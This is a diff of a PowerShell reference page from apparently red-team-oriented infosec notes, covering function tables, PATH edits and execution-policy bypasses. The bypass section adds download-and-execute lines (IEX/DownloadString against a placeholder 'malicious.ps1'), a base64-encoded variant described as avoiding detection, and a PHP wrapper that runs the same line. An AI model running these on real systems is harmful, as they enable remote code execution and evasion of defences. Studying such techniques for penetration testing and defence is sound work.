@@ -304,7 +304,7 @@ $myScriptBlock.Invoke(5, 10)  # Output: 15
 #### Categorized Functions
 
 
-#### Security Functions
+##### Security Functions
 
 The following table lists PowerShell functions categorized under Security:
 
@@ -322,7 +322,7 @@ The following table lists PowerShell functions categorized under Security:
 | [Set-NetFirewallRule](https://www.pdq.com/powershell/set-netfirewallrule/)                   | Modifies existing firewall rules.                                                                                                      |
 | [Suspend-BitLocker](https://www.pdq.com/powershell/suspend-bitlocker/)                       | Suspends Bitlocker encryption for the specified volume.                                                                                |
 
-#### Network Functions
+##### Network Functions
 
 The following table lists PowerShell functions categorized under Network:
 
@@ -353,7 +353,7 @@ The following table lists PowerShell functions categorized under Network:
 | [Set-NetIPInterface](https://www.pdq.com/powershell/set-netipinterface/)                     | Modifies an IP interface.                                                                                                              |
 | [Test-NetConnection](https://www.pdq.com/powershell/test-netconnection/)                     | Displays diagnostic information for a connection.                                                                                      |
 
-#### PoSh Functions
+##### PoSh Functions
 
 The following table lists PowerShell functions categorized as PowerShell-specific):
 
@@ -371,7 +371,7 @@ The following table lists PowerShell functions categorized as PowerShell-specifi
 | [Update-Module](https://www.pdq.com/powershell/update-module/)                               | Downloads and installs the newest version of specified modules from an online gallery to the local computer.                           |
 | [Update-Script](https://www.pdq.com/powershell/update-script/)                               | Updates a script.                                                                                                                      |
 
-#### Scheduled Tasks Functions
+##### Scheduled Tasks Functions
 
 The following table lists PowerShell functions categorized under Scheduled Tasks:
 
@@ -388,7 +388,7 @@ The following table lists PowerShell functions categorized under Scheduled Tasks
 | [Set-ScheduledTask](https://www.pdq.com/powershell/set-scheduledtask/)                       | Modifies a scheduled task.                                                                                                             |
 | [Unregister-ScheduledTask](https://www.pdq.com/powershell/unregister-scheduledtask/)         | Unregisters a scheduled task.                                                                                                          |
 
-#### Printer Functions
+##### Printer Functions
 
 The following table lists PowerShell functions categorized under Printer:
 
@@ -401,7 +401,7 @@ The following table lists PowerShell functions categorized under Printer:
 | [Remove-Printer](https://www.pdq.com/powershell/remove-printer/)                             | Removes a printer from the specified computer.                                                                                         |
 | [Set-Printer](https://www.pdq.com/powershell/set-printer/)                                   | Updates the configuration of an existing printer.                                                                                      |
 
-#### Storage Functions
+##### Storage Functions
 
 The following table lists PowerShell functions categorized under Storage:
 
@@ -429,7 +429,7 @@ The following table lists PowerShell functions categorized under Storage:
 | [Set-Partition](https://www.pdq.com/powershell/set-partition/)                               | Sets attributes of a partition, such as active, read-only, and offline states.                                                         |
 | [Set-PhysicalDisk](https://www.pdq.com/powershell/set-physicaldisk/)                         | Sets attributes on a specific physical disk.                                                                                           |
 
-#### Utility Functions
+##### Utility Functions
 
 The following table lists PowerShell functions categorized under Utility:
 
@@ -442,7 +442,7 @@ The following table lists PowerShell functions categorized under Utility:
 | [New-Guid](https://www.pdq.com/powershell/new-guid/)                                         | Creates a GUID.                                                                                                                        |
 | [Set-Clipboard](https://www.pdq.com/powershell/set-clipboard/)                               | Sets the current Windows clipboard entry.                                                                                              |
 
-#### SMB Functions
+##### SMB Functions
 
 The following table lists PowerShell functions categorized under SMB:
 
@@ -461,7 +461,7 @@ The following table lists PowerShell functions categorized under SMB:
 | [Set-SmbShare](https://www.pdq.com/powershell/set-smbshare/)                                 | Modifies the properties of the SMB share.                                                                                              |
 | [Set-SmbServerConfiguration](https://www.pdq.com/powershell/set-smbserverconfiguration/)     | Sets the SMB Service configuration.                                                                                                    |
 
-#### Apps Functions
+##### Apps Functions
 
 The following table lists PowerShell functions categorized under Apps:
 
@@ -469,7 +469,7 @@ The following table lists PowerShell functions categorized under Apps:
 | -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
 | [Get-StartApps](https://www.pdq.com/powershell/get-startapps/)                               | Gets the names and AppIDs of installed apps.                                                                                           |
 
-#### Hardware Functions
+##### Hardware Functions
 
 The following table lists PowerShell functions categorized under Hardware:
 
@@ -495,7 +495,9 @@ $PSVersionTable
 
 ## Script Execution Policy
 
-TODO: add short description about what this is and why it's important (issue [#26](https://github.com/zweilosec/Infosec-Notes/issues/26))
+The Script Execution Policy in PowerShell is a security feature that determines the conditions under which PowerShell scripts are allowed to run. This is important because it helps prevent the execution of malicious scripts by enforcing restrictions on script execution. Understanding and configuring the Script Execution Policy is crucial for maintaining a secure environment while using PowerShell.
+
+Bypassing these restrictions is trivial, however, depending on the scope of the change. Attackers do this to execute scripts, escalate privileges, or maintain persistence on a compromised system. By knowing the execution policy and its limitations, attackers can identify potential methods to avoid or exploit these settings, such as using the Bypass policy or leveraging misconfigurations.
 
 | Policy           | Description                                                                                                                                                                                                                    |
 | ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
@@ -506,11 +508,105 @@ TODO: add short description about what this is and why it's important (issue [#2
 | **Restricted**   | All .ps1 files are blocked.                                                                                                                                                                                                    |
 | **Undefined**    | There is no execution policy set in the current scope. Reverts to **Default** policy.                                                                                                                                          |
 
-To view current execution policy check use the cmdlet `Get-ExecutionPolicy`. If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems (Windows 10) or **RemoteSigned** (Server 2016+). _\*\*_The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`.
+To view current execution policy check use the cmdlet `Get-ExecutionPolicy`. If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems (Windows 10) or **RemoteSigned** (Server 2016+). 
+
+The policy can be changed with the cmdlet `Set-ExecutionPolicy`.
+
+```powershell
+Set-ExecutionPolicy $PolicyName
+```
 
 {% hint style="success" %}
 For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows-redteam/privilege-escalation.md#script-execution-policy-bypass-methods).
 {% endhint %}
+
+### PowerShell Script Execution Bypass
+
+Get the current PowerShell script execution policy for all scopes with:
+
+```powershell
+Get-ExecutionPolicy -List
+```
+
+Most likely this will be set to `Restricted`, but you need to have admin rights to change this (with one caveat later). So, in order to run scripts, you will need to use one of the following bypass methods.
+
+#### Change Execution Method with `-Scope CurrentUser`
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope CurrentUser -File script.ps1
+```
+
+You can change the Execution Policy for the current user by using the `-Scope CurrentUser` argument.  This will still not allow you to run scripts in other contexts (such as in scheduled tasks), but all scripts run as the current user will now function just fine.  This is the easiest bypass method but requires making a configuration change that could potentially be detected.
+
+#### Copy and paste script code into PowerShell
+
+The second easiest method is to simply copy and paste the code from the script into a PowerShell console.  It may prompt you to verify that you intend to paste multiple lines, simply click "yes".  As long as the code does not have any strange formatting that prevents it from running line by line, the whole script will run.  If the script contains a function, you can continue to use this function simply by calling its name.
+
+#### `Echo` the script code into PowerShell
+
+This technique is similar to the previous, in that you must copy and paste the code from the script into a PowerShell console.  However, you must prefix your code with the `echo` (Alias for `Write-Output`) command and then pipe the copied code into `PowerShell.exe`, like below:
+
+```powershell
+echo Test-YourCode | PowerShell -NoProfile -
+```
+
+{% hint style="info" %}
+If your code contains multiple lines, quotes, or is contained within a function it may not execute properly, or at all.  You will have to experiment with wrapping the code in quotes or escaping certain characters.  This may seem like a pain, but the upside to this technique is that it requires no configuration changes, and the code is run entirely in memory.
+{% endhint %}
+
+#### Using the `-Command` Parameter
+
+You can execute a script directly from the command line without saving it to disk by putting it into a code block and using the `-Command` parameter:
+
+```powershell
+powershell.exe -NoProfile -Command "& {Get-Process}"
+```
+
+#### Embedding in a PHP Script
+
+You can embed a PowerShell bypass in a PHP script to execute commands:
+
+```php
+<?php
+$cmd = "powershell.exe -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\"";
+system($cmd);
+?>
+```
+
+#### Using Encoded Commands
+
+You can encode the PowerShell command to avoid detection:
+
+```powershell
+$command = "IEX(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $encodedCommand
+```
+
+#### Using `Invoke-Expression`
+
+You can use `Invoke-Expression` to execute a script in memory:
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
+```
+
+#### Using `Get-Content` and Piping
+
+You can read the contents of a script and pipe it into PowerShell:
+
+```powershell
+Get-Content script.ps1 | powershell.exe -NoProfile -
+```
+
+This can also be done remotely using a UNC path:
+
+```powershell
+Get-Content "\\RemoteComp\Test-YourCode.ps1" | PowerShell -NoProfile -
+```
+
+For more details on PowerShell bypass methods and their role in privilege escalation, see the [Windows Privilege Escalation](../windows-redteam/privilege-escalation.md#script-execution-policy-bypass-methods) page.
 
 ## Environment Variables
 
@@ -559,10 +655,10 @@ Examples:
 * `$env:path`
 
 {% hint style="info" %}
-If you set a value to a environment variable that does not exist, Windows will create it.  You can use this to create your own custom environment variables.
+If you set a value to an environment variable that does not exist, Windows will create it.  You can use this to create your own custom environment variables.
 {% endhint %}
 
-You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:
+You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, you can use the `Set-Item` cmdlet to append `C:\Windows\Temp` to the value of the `$Env:PATH` environment variable (see the following section).
 
 ### Adding a Folder to PATH
 
@@ -575,33 +671,61 @@ In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in p
 {% endhint %}
 
 {% tabs %}
-{% tab title="Windows" %}
+{% tab title="PowerShell" %}
 To append `C:\Windows\Temp` to the PATH , use the following syntax (note the (`;`) separator):
 
 ```bash
 $Env:PATH += ";C:\Windows\Temp"
 ```
-{% endtab %}
 
-{% tab title="Linux/MacOS" %}
-On Linux or MacOS, the colon (`:`) in the command separates each path in the list.
+#### Add a folder to PATH using `System.Environment` .NET methods <a href="#using-systemenvironment-methods" id="using-systemenvironment-methods"></a>
 
-```bash
-$Env:PATH += ":/temp"
-```
-{% endtab %}
-{% endtabs %}
+The **System.Environment** .NET class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.
 
-#### Add a folder to PATH using `System.Environment` methods <a href="#using-systemenvironment-methods" id="using-systemenvironment-methods"></a>
-
-The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.
-
-The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy
+The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.
 
 ```powershell
 $path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
 $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
 ```
+
+{% endtab %}
+{% tab title="cmd.exe" %}
+
+To append `C:\Windows\Temp` to the PATH in Windows CMD, use the following syntax (note the `;` separator):
+
+```cmd
+set PATH=%PATH%;C:\Windows\Temp
+```
+
+To make this change permanent, use the `setx` command:
+
+```cmd
+setx PATH "%PATH%;C:\Windows\Temp"
+```
+
+Note: Changes made with `setx` will only take effect in new CMD sessions. Also beware the maximum character limit of 256, as PATHs longer than this will get truncated.
+
+{% endtab %}
+
+{% tab title="Linux/MacOS" %}
+On Linux or MacOS, the colon (`:`) in the command separates each path in the list.
+
+#### Linux/MacOS
+To append `/temp` to the PATH, use the following syntax (note the `:` separator):
+
+```bash
+export PATH="$PATH:/temp"
+```
+
+To make this change permanent, add the above line to your shell's configuration file (e.g., `~/.bashrc`, `~/.zshrc`, or `~/.bash_profile`) and reload the configuration using:
+
+```bash
+source ~/.bashrc
+```
+
+{% endtab %}
+{% endtabs %}
 
 ## Working with Files
 
@@ -680,11 +804,11 @@ ForEach-Object {
 
 Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names in the shorthand version, you may want to note the following significant differences between the "full" versions and the "condensed" version:
 
-* `Select-String` was swapped to use piped input instead of `-InputObject`.&#x20;
-* The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional.&#x20;
-* The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line.&#x20;
-* `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true.&#x20;
-  * Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.&#x20;
+* `Select-String` was swapped to use piped input instead of `-InputObject`.
+* The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional.
+* The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line.
+* `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true.
+  * Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.
 * `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
   * `ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}`
 
@@ -737,13 +861,15 @@ The default paths to the executables for PowerShell and PowerShell ISE on releva
 {% endtab %}
 
 {% tab title="Linux/MacOS" %}
+
 PowerShell full path: `/usr/local/microsoft/powershell/7/`
 
 7 is the version number of PS Core, so this can change...
+
 {% endtab %}
 {% endtabs %}
 
-### Downloading files with PowerShell (`wget`)&#x20;
+### Downloading files with PowerShell (`wget`)
 
 #### PowerShell version of `wget:`
 
@@ -765,68 +891,13 @@ Retrieve file and execute remote code after downloading (in-memory!):
 powershell -c "Invoke-Expression(New-Object System.Net.Webclient).downloadString('http://$ip:$port/$file')"
 ```
 
-### PowerShell Script Execution Bypass
-
-TODO: Expand and clean up PowerShell Bypass section. Link to Windows Privilege Escalation page (issue [#27](https://github.com/zweilosec/Infosec-Notes/issues/27))
-
-* Take examples from [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) and add
-* Write script example of embedding the below PowerShell bypass in php script
-* Check the PowerShell example below and see if the trailing `-` means something is missing
-* Link or add this information to Windows Privilege Escalation page
-
-Get the current PowerShell script execution policy with:
-
-```powershell
-Get-ExecutionPolicy -List
-```
-
-Most likely this will be set to `Restricted`, but you need to have admin rights to change this (with one caveat later). So, in order to run scripts, you will need to use one of the following bypass methods.
-
-#### Change Execution Method with `-Scope CurrentUser`
-
-```powershell
-Set-ExecutionPolicy -Scope CurrentUser Bypass
-```
-
-You can change the Execution Policy for the current user by using the `-Scope CurrentUser` argument.  This will still not allow you to run scripts in other contexts (such as in scheduled tasks), but all scripts run as the current user will now function just fine.   This is the easiest bypass method but requires making a configuration change that could potentially be detected.
-
-#### Copy and paste script code into PowerShell
-
-The second easiest method is to simply copy and paste the code from the script into a PowerShell console.  It may prompt you to verify that you intend to paste multiple lines, simply click "yes".  As long as the code does not have any strange formatting that prevents it from running line by line, the whole script will run.  If the script contains a function, you can continue to use this function simply by calling its name.
-
-#### `Echo` the script code into PowerShell
-
-This technique is similar to the previous, in that you must copy and paste the code from the script into a PowerShell console.  However, you must prefix your code with the `echo` (Alias for `Write-Output`) command and then pipe the copied code into `PowerShell.exe`, like below:
-
-```powershell
-echo Test-YourCode | PowerShell -NoProfile -
-```
-
-If your code contains multiple lines, quotes, or is contained within a function it may not execute properly, or at all.  You will have to experiment with wrapping the code in quotes or escaping certain characters.  This may seem like a pain, but the upside to this technique is that it requires no configuration changes, and the code is run entirely in memory. &#x20;
-
-#### Read the contents of a file and pipe code into PowerShell
-
-Similar to the previous example, but with the major advantage of not having to do any complicated nested quoting or escaping to get the code to function normally.  However, this technique does rely on the file being either on disk, or accessible through a network share.
-
-```powershell
-Get-Content "\\RemoteComp\Test-YourCode.ps1" | PowerShell -NoProfile -
-```
-
-
-
-...more to come!
-
-```bash
-echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
-```
-
 ### Silence PowerShell error messages
 
 Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribute, which works similarly to using **`2>/dev/null`** in Linux. However, this only works for that cmdlet, not the entire one-liner if you pipe output or use semi-colons, etc. This can be shortened to **`-EA Silently`**.
 
 ### Unsorted...
 
-PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE) TODO: look up this tool and give examples and description
+PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)
 
 ## Resources
 
@@ -834,9 +905,10 @@ PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this
 * [http://go.microsoft.com/fwlink/?LinkID=135170](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7)
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7)
 * [https://www.pdq.com/powershell/](https://www.pdq.com/powershell/)
+* [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 * TODO:
   * [https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/) - site down?
-  * [https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/)&#x20;
+  * [https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/)
 * [https://www.infosecmatter.com/pure-powershell-infosec-cheatsheet/](https://www.infosecmatter.com/pure-powershell-infosec-cheatsheet/)
 
 
